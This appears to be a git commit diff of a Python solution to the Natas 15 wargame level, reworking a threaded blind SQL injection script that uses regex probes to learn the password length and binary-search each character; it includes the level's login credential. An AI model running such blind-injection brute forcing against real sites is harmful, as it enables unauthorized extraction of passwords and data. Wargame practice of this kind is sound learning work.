3d158986a8f234d90a3e22e4c479900e6f16501f
Piotr Czajka <piotr_czajka@outlook.com>
2017-09-18 18:48:21 +0200

    Natas 15 done

--- natas/natas15.py
+++ natas/natas15.py
@@ -1,4 +1,6 @@
 import requests
+from threading import Thread
+from queue import Queue, Empty
 import string
 from bs4 import BeautifulSoup
 from requests.auth import HTTPBasicAuth
@@ -7,7 +9,6 @@ password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
 username = 'natas15'
 
 # SQL: SELECT * FROM users where username="" -- "
-
 
 def hackzor(regexp):
     data = {
@@ -40,26 +41,85 @@ def hackzor(regexp):
     return False
 
 
-def get_next_char(rng, passquery):
-    if hackzor(passquery + '$'):
-        return '$'
-    start = rng[1]
-    end = rng[-1]
-    if not hackzor('[]')
+def pass_len(i, queue):
+    res = hackzor('^\.{'+str(i)+'}$')
+    if res:
+        queue.put(i)
+
+
+def get_pass_len():
+    threads = []
+    queue = Queue()
+    for i in range(30, 40):
+        thread = Thread(target=pass_len, args=(i, queue))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+    return queue.get()
+
+
+def determine_alphabet(i, alphabets):
+    for alph in alphabets:
+        regex = '^\.{{{}}}[{}-{}]'.format(i, alph[0], alph[-1])
+        if hackzor(regex):
+            return alph
+
+
+def is_char_in_range(a, b, i):
+    regex = '^\.{{{}}}[{}-{}]'.format(i, a, b)
+    res = hackzor(regex)
+    return res
+
+
+def char_is_at_ix(i, char):
+    regex = '^\.{{{}}}{}'.format(i, char)
+    return hackzor(regex)
+
+
+def get_char_at_ix_alph(i, alphabet):
+    start = 0
+    end = len(alphabet) - 1
+    while start < end - 1:
+        temp = int((start + end) / 2)
+        if is_char_in_range(alphabet[temp], alphabet[end], i):
+            start = temp
+        else:
+            end = temp
+    if char_is_at_ix(i, alphabet[end]):
+        return alphabet[end]
+    return alphabet[start]
+
+
+def get_chr_at_ix(i, queue):
+    ranges = (string.ascii_lowercase, string.ascii_uppercase, string.digits)
+    i = str(i)
+    alphabet = determine_alphabet(i, ranges)
+    queue.put((int(i), get_char_at_ix_alph(i, alphabet)))
 
 
 def smart_bruteforce_password():
-    passquery = '^'
-    ranges = (string.ascii_lowercase, string.ascii_uppercase, string.digits)
+    pass_len = get_pass_len()
+    queue = Queue()
+    threads = []
+    for i in range(pass_len):
+        thread = Thread(target=get_chr_at_ix, args=(i, queue))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+    password = ['*' for x in range(pass_len)]
+    chars = []
     while True:
-        for rng in ranges:
-            char = get_next_char(rng, passquery)
-            if char:
-                passquery += char
-                break
-        print(passquery)
-        if passquery.endswith('$'):
-            return passquery[1:-1]
+        try:
+            i, char = queue.get_nowait()
+            chars.append((i, char))
+        except Empty:
+            break
+    for ix, char in chars:
+        password[ix] = char
+    return ''.join(password)
 
 
 password = smart_bruteforce_password()
+print(password)
